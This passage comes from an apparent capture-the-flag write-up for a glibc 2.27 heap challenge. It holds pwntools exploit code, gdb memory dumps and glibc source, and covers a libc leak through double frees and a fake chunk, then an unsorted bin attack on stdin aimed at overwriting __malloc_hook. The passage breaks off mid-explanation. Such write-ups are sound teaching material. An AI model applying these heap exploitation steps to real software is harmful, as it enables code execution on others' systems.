+add(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">40</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;E&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">39</span>)
+
+add(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">40</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x21</span>)) <span style="color:#6272a4"># barrier</span>
+
+<span style="color:#6272a4"># freexalloc(5, 560, b&#34;&#34;, doubleFree=True)</span>
+
+freexalloc(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+
+freexalloc(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+add(<span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">56</span>  <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xb1</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># fake unsorted chunk</span>
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
+</span><span style="color:#f1fa8c">0x555555608570:	0x00005555556085a0	0x4141414141414141
+</span><span style="color:#f1fa8c">0x555555608580:	0x4141414141414141	0x4141414141414141
+</span><span style="color:#f1fa8c">0x555555608590:	0x4141414141414141	0x4141414141414141
+</span><span style="color:#f1fa8c">0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
+</span><span style="color:#f1fa8c">0x5555556085b0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085c0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085d0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &lt;- Fake size | PREV_INUSE (1)
+</span><span style="color:#f1fa8c">0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
+</span><span style="color:#f1fa8c">0x555555608600:	0x4343434343434343	0x4343434343434343	 
+</span><span style="color:#f1fa8c">0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
+</span><span style="color:#f1fa8c">0x555555608620:	0x4444444444444444	0x4444444444444444	 
+</span><span style="color:#f1fa8c">0x555555608630:	0x000000000000000a	0x0000000000000000
+</span><span style="color:#f1fa8c">0x555555608640:	0x0000000000000000	0x0000000000000000	 
+</span><span style="color:#f1fa8c">0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
+</span><span style="color:#f1fa8c">0x555555608660:	0x4545454545454545	0x4545454545454545	 
+</span><span style="color:#f1fa8c">0x555555608670:	0x4545454545454545	0x4545454545454545	 
+</span><span style="color:#f1fa8c">0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
+</span><span style="color:#f1fa8c">0x555555608690:	0x0000000000000000	0x0000000000000021 &lt;- Fake chunk header 
+</span><span style="color:#f1fa8c">0x5555556086a0:	0x000000000000000a	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556086b0:	0x0000000000000000	0x0000000000020951 &lt;- Top chunk
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">fastbins
+</span><span style="color:#f1fa8c">0x30: 0x5555556085e0 ◂— 0x0
+</span><span style="color:#f1fa8c">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks">this resource</a>.</p>
+<p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+
+freexalloc(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">560</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+<span style="color:#6272a4"># falls into the unsortedbin</span>
+
+show(<span style="color:#bd93f9">2</span>)
+
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x3ebca0</span> <span style="color:#6272a4"># offset of the unsorted bin</span>
+
+stdin <span style="color:#ff79c6">=</span> libc <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3eba00</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">0x555555608560:	0x0000000000000000	0x0000000000000041
+</span><span style="color:#f1fa8c">0x555555608570:	0x00005555556085a0	0x4141414141414141
+</span><span style="color:#f1fa8c">0x555555608580:	0x4141414141414141	0x4141414141414141
+</span><span style="color:#f1fa8c">0x555555608590:	0x4141414141414141	0x4141414141414141
+</span><span style="color:#f1fa8c">0x5555556085a0:	0x0a41414141414141	0x0000000000000041
+</span><span style="color:#f1fa8c">0x5555556085b0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085c0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085d0:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556085e0:	0x0000000000000000	0x00000000000000b1
+</span><span style="color:#f1fa8c">0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
+</span><span style="color:#f1fa8c">0x555555608600:	0x4343434343434343	0x4343434343434343
+</span><span style="color:#f1fa8c">0x555555608610:	0x0a43434343434343	0x0000000000000041
+</span><span style="color:#f1fa8c">0x555555608620:	0x4444444444444444	0x4444444444444444
+</span><span style="color:#f1fa8c">0x555555608630:	0x000000000000000a	0x0000000000000000
+</span><span style="color:#f1fa8c">0x555555608640:	0x0000000000000000	0x0000000000000000
+</span><span style="color:#f1fa8c">0x555555608650:	0x0000000000000000	0x0000000000000031
+</span><span style="color:#f1fa8c">0x555555608660:	0x4545454545454545	0x4545454545454545
+</span><span style="color:#f1fa8c">0x555555608670:	0x4545454545454545	0x4545454545454545
+</span><span style="color:#f1fa8c">0x555555608680:	0x0a45454545454545	0x0000000000000031
+</span><span style="color:#f1fa8c">0x555555608690:	0x00000000000000b0	0x0000000000000020
+</span><span style="color:#f1fa8c">0x5555556086a0:	0x000000000000000a	0x0000000000000000
+</span><span style="color:#f1fa8c">0x5555556086b0:	0x0000000000000000	0x0000000000020951
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">unsortedbin
+</span><span style="color:#f1fa8c">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+</span><span style="color:#f1fa8c">tcachebins
+</span><span style="color:#f1fa8c">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div><p>Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Shell" data-lang="Shell">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b<span style="color:#f1fa8c">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&#39;</span>
+<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Debugging process with ASLR disabled
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Starting <span style="color:#8be9fd;font-style:italic">local</span> process <span style="color:#f1fa8c">&#39;/usr/bin/gdbserver&#39;</span>: pid <span style="color:#bd93f9">31378</span>
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> running in new terminal: <span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;/usr/bin/gdb&#39;</span>, <span style="color:#f1fa8c">&#39;-q&#39;</span>, <span style="color:#f1fa8c">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>, <span style="color:#f1fa8c">&#39;-x&#39;</span>, <span style="color:#f1fa8c">&#39;/tmp/pwn1z_5e0ie.gdb&#39;</span><span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> libc: 0x7ffff79e4000
+</code></pre></div><p>We now have achieved the first step of the challenge: leak the libc base address.</p>
+<h2 id="what-can-we-target-in-the-libc-">What can we target in the libc ?</h2>
+<p>There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469">glibc source code</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_file_underflow</span> (_IO_FILE <span style="color:#ff79c6">*</span>fp)
+{
+  _IO_ssize_t count;
+<span style="color:#ff79c6">#if 0</span><span style="color:#6272a4">
+</span><span style="color:#6272a4">  /* SysV does not make this test; take it out for compatibility */
+</span><span style="color:#6272a4">  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
+</span><span style="color:#6272a4">    return (EOF);
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">#endif
+</span><span style="color:#ff79c6"></span>
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_NO_READS)
+    {
+      fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      <span style="color:#ff79c6">return</span> EOF;
+    }
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">&lt;</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end)
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+    {
+      <span style="color:#6272a4">/* Maybe we already have a push back pointer.  */</span>
+      <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+	{
+	  free (fp<span style="color:#ff79c6">-&gt;</span>_IO_save_base);
+	  fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;=</span> <span style="color:#ff79c6">~</span>_IO_IN_BACKUP;
+	}
+      _IO_doallocbuf (fp);
+    }
+
+  <span style="color:#6272a4">/* Flush all line buffered files before reading. */</span>
+  <span style="color:#6272a4">/* FIXME This can/should be moved to genops ?? */</span>
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF<span style="color:#ff79c6">|</span>_IO_UNBUFFERED))
+    {
+<span style="color:#ff79c6">#if 0</span><span style="color:#6272a4">
+</span><span style="color:#6272a4">      _IO_flush_all_linebuffered ();
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">#else
+</span><span style="color:#ff79c6"></span>      <span style="color:#6272a4">/* We used to flush all line-buffered stream.  This really isn&#39;t
+</span><span style="color:#6272a4">	 required by any standard.  My recollection is that
+</span><span style="color:#6272a4">	 traditional Unix systems did this for stdout.  stderr better
+</span><span style="color:#6272a4">	 not be line buffered.  So we do just that here
+</span><span style="color:#6272a4">	 explicitly.  --drepper */</span>
+      _IO_acquire_lock (_IO_stdout);
+
+      <span style="color:#ff79c6">if</span> ((_IO_stdout<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINKED <span style="color:#ff79c6">|</span> _IO_NO_WRITES <span style="color:#ff79c6">|</span> _IO_LINE_BUF))
+	  <span style="color:#ff79c6">==</span> (_IO_LINKED <span style="color:#ff79c6">|</span> _IO_LINE_BUF))
+	_IO_OVERFLOW (_IO_stdout, EOF);
+
+      _IO_release_lock (_IO_stdout);
+<span style="color:#ff79c6">#endif
+</span><span style="color:#ff79c6"></span>    }
+
+  _IO_switch_to_get_mode (fp);
+
+  <span style="color:#6272a4">/* This is very tricky. We have to adjust those
+</span><span style="color:#6272a4">     pointers before we call _IO_SYSREAD () since
+</span><span style="color:#6272a4">     we may longjump () out while waiting for
+</span><span style="color:#6272a4">     input. Those pointers may be screwed up. H.J. */</span>
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_end
+    <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+
+  count <span style="color:#ff79c6">=</span> _IO_SYSREAD (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base,
+		       fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_end <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+  <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>)
+    {
+      <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+	fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_EOF_SEEN;
+      <span style="color:#ff79c6">else</span>
+	fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN, count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+  }
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">+=</span> count;
+  <span style="color:#ff79c6">if</span> (count <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+    {
+      <span style="color:#6272a4">/* If a stream is read to EOF, the calling application may switch active
+</span><span style="color:#6272a4">	 handles.  As a result, our offset cache would no longer be valid, so
+</span><span style="color:#6272a4">	 unset it.  */</span>
+      fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> _IO_pos_BAD;
+      <span style="color:#ff79c6">return</span> EOF;
+    }
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">!=</span> _IO_pos_BAD)
+    _IO_pos_adjust (fp<span style="color:#ff79c6">-&gt;</span>_offset, count);
+  <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) fp<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+}
+</code></pre></div><p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&rsquo;s actually going on:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/100gx stdin
+0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
+0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa30 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
+0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfa84	0x0000000000000000
+0x7ffff7dcfa50 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfa60 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfa70 &lt;_IO_2_1_stdin_+112&gt;:	0x0000001000000000	0xffffffffffffffff
+0x7ffff7dcfa80 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffff7dd18d0
+0x7ffff7dcfa90 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000
+0x7ffff7dcfaa0 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffff7dcfae0	0x0000000000000000
+0x7ffff7dcfab0 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfac0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000
+0x7ffff7dcfad0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0
+0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfaf0 &lt;_IO_wide_data_0+16&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb00 &lt;_IO_wide_data_0+32&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb10 &lt;_IO_wide_data_0+48&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb20 &lt;_IO_wide_data_0+64&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb30 &lt;_IO_wide_data_0+80&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb40 &lt;_IO_wide_data_0+96&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb50 &lt;_IO_wide_data_0+112&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb60 &lt;_IO_wide_data_0+128&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb70 &lt;_IO_wide_data_0+144&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb80 &lt;_IO_wide_data_0+160&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfb90 &lt;_IO_wide_data_0+176&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfba0 &lt;_IO_wide_data_0+192&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbb0 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbc0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbd0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbe0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dcbd60	0x0000000000000000
+0x7ffff7dcfc20 &lt;__memalign_hook&gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
+0x7ffff7dcfc30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001
+0x7ffff7dcfc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x00005555556085e0
+0x7ffff7dcfc60 &lt;main_arena+32&gt;:	0x0000555555608560	0x0000000000000000
+0x7ffff7dcfc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfc90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0	&lt;- &amp;unsortedbin = 0x7ffff7dcfca0
+pwndbg&gt; p *stdin
+$1 = {
+  _flags = -72540021,
+  _IO_read_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_read_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
+  _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
+  _IO_save_base = 0x0,
+  _IO_backup_base = 0x0,
+  _IO_save_end = 0x0,
+  _markers = 0x0,
+  _chain = 0x0,
+  _fileno = 0,
+  _flags2 = 16,
+  _old_offset = -1,
+  _cur_column = 0,
+  _vtable_offset = 0 '\000',
+  _shortbuf = &quot;\n&quot;,
+  _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,
+  _offset = -1,
+  _codecvt = 0x0,
+  _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,
+  _freeres_list = 0x0,
+  _freeres_buf = 0x0,
+  __pad5 = 0,
+  _mode = -1,
+  _unused2 = '\000' &lt;repeats 19 times&gt;
+}
+</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not understand fully my explanations, I advise you to take a look at <a href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/">this great article</a>.</p>
+<p>Then we should be able to control every bytes between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
+<p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
+<h2 id="unsorted-bin-attack-on-stdin-_io_buf_end">Unsorted bin attack on stdin-&gt;_IO_buf_end</h2>
+<p>Here was theory, let&rsquo;s see how we can do that. To understand unsorted bin attack <a href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/">here</a> is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:</p>
+<ul>
+<li>overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code></li>
+<li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
+<li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
+</ul>
+<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519">code</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>
+<span style="color:#50fa7b">_int_malloc</span> (mstate av, size_t bytes)
+{
+
